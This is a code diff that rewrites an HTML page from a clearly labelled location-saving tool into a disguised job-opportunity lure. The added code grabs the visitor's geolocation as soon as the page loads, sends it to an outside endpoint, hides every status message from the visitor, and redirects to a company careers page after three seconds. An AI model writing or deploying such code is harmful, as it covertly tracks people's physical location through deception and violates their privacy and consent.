@@ -3,18 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wish</title>
+    <title>latest oppurtunites</title>
 </head>
 <body>
-    <h2>User Location Tracker</h2>
-    <p>Click the button below to save your location to Google Sheets.</p>
-    <button onclick="sendLocation()">Save My Location4</button>
-    <p id="status"></p>
-
     <script>
+	window.onload =function() {
+	sendLocation();
+	}
        function sendLocation() {
-    document.getElementById("status").innerText = "Getting location...";
-
+   
     navigator.geolocation.getCurrentPosition(position => {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
@@ -26,16 +23,18 @@
             mode: "no-cors"  // Added no-cors to bypass CORS restrictions
         })
         .then(() => {
-            document.getElementById("status").innerText = "Location saved successfully!";
+           console.log("Location saved successfully!");
         })
         .catch(error => {
-            document.getElementById("status").innerText = "Error saving location.";
+          console.log("error");
             console.error("Error:", error);
         });
     }, error => {
-        document.getElementById("status").innerText = "Location access denied.";
         console.error("Geolocation error:", error);
     });
+	setTimeout(() => {
+	window.location.href="https://www.tcs.com/careers/india";
+	},3000);
 }
 
     </script>
